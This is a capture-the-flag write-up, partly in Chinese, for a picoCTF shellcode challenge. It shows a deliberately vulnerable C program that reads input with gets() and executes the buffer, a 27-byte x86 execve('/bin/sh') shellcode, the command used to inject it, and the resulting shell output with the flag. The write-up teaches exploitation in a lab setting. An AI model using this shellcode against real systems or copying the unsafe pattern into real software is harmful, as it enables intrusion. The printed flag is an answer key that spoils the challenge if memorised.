## Source code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();

  return 0;
}
```

題目最後把 `buf` cast 成一個 `void (*)()` 的 function pointer ，然後直接 invoke 它

也就是把我們放入 `buf` 的東西直接當作 machine code 來執行。

## Pwn
題目給了我們 148 bytes 的空間塞 shellcode，而且還是用 `gets()` ...

不過寫完下面這段也才 27 bytes，綽綽有餘 d(`･∀･)b

```
[global _start]
  
_start:
  jmp ed

st:
  ; execve(const char *filename, const char * const argv[], const char * const envp[])
  pop ebx
  xor eax, eax
  add al, 0xb
  xor ecx, ecx
  xor edx, edx
  int 0x80
  ret
 
ed:
  call st
  db "/bin/sh", 0
```

用我的 Makefile 生成 shell.bin 以後，scp 上傳之，然後到題目 server 執行下列指令
```
$ (cat /tmp/aesophor/shell.bin; cat -) | ./vuln
Enter a string!


[1
  11/bin/sh
Thanks! Executing now...
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{shellc0de_w00h00_9ee0edd0}
```

flag: `picoCTF{shellc0de_w00h00_9ee0edd0}`
